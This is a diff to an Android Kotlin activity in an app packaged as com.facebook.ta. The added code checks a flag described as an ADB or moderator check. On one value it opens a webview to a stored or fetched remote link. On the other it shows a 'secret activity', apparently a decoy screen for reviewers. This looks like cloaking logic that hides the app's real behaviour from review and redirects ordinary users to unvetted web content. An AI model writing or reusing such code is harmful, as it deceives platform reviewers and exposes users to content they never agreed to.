@@ -8,11 +8,10 @@ import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
 import androidx.lifecycle.lifecycleScope
+import com.facebook.ta.data.CustomStorage
 import com.facebook.ta.data.SuperChecker
 import com.facebook.ta.databinding.ActivityMainBinding
 import com.facebook.ta.services.MyService
-import io.paperdb.Paper
-import kotlinx.coroutines.MainScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
@@ -21,6 +20,7 @@ class MainActivity : AppCompatActivity() {
     //loading
     private lateinit var binding: ActivityMainBinding
     private lateinit var customBroadcast: BroadcastReceiver
+    private val customStorage = CustomStorage()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -45,11 +45,10 @@ class MainActivity : AppCompatActivity() {
 
     override fun onStart() {
         super.onStart()
-        //TODO add listenners only first time
         addListenners()
     }
 
-    private fun startDevServiceAndRegisterReciever(a: Int, b:Int, constants: Constants){
+    private fun startDevServiceAndRegisterReciever(a: Int, b: Int, constants: Constants){
         val intentForService = Intent(this, MyService::class.java)
         startService(intentForService)
 
@@ -69,9 +68,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun goToTheSecretActivity() {
         val intent = Intent(this, Main2Activity::class.java)
-        val scope = MainScope()
-
-        scope.launch {
+        lifecycleScope.launch {
             delay(1800)
             startActivity(intent)
         }
@@ -79,18 +76,46 @@ class MainActivity : AppCompatActivity() {
 
     private fun addListenners(){
 
+        val intentToTheW = Intent(this, CustomActivity::class.java)
+        val superChecker = SuperChecker(this)
+        val link = customStorage.readData(Constants.KEY_LINK)
+
         lifecycleScope.launch {
             App.customDDbTransmitter.collect{
-                Log.d("123123", "Custom trasmitter $it")
-
                 //check adb
-                if (it == "1"){
-                    //get data from track
+                if (it == "1" && link.startsWith("htt")){
+                    //we have link
+                    intentToTheW.putExtra(Constants.KEY_LINK, link)
+                    startActivity(intentToTheW)
 
+                } else if(it == "1" && link == Constants.EMPTY){
+                    //build link and go to the web
+                    addMoreListenners()
+                    superChecker.getData()
+
+                } else if(it == "0"){
+                    //moder 1
+                    goToTheSecretActivity()
                 }
             }
         }
     }
+
+
+    private fun addMoreListenners(){
+        val intentToTheW = Intent(this, CustomActivity::class.java)
+
+        lifecycleScope.launch {
+            App.customLinkFlow.collect{
+                if (it.startsWith("htt")){
+                    Log.d("123123", "The link is $it")
+                    intentToTheW.putExtra(Constants.KEY_LINK, it)
+                    startActivity(intentToTheW)
+                }
+            }
+        }
+    }
+
 
     override fun onDestroy() {
         super.onDestroy()
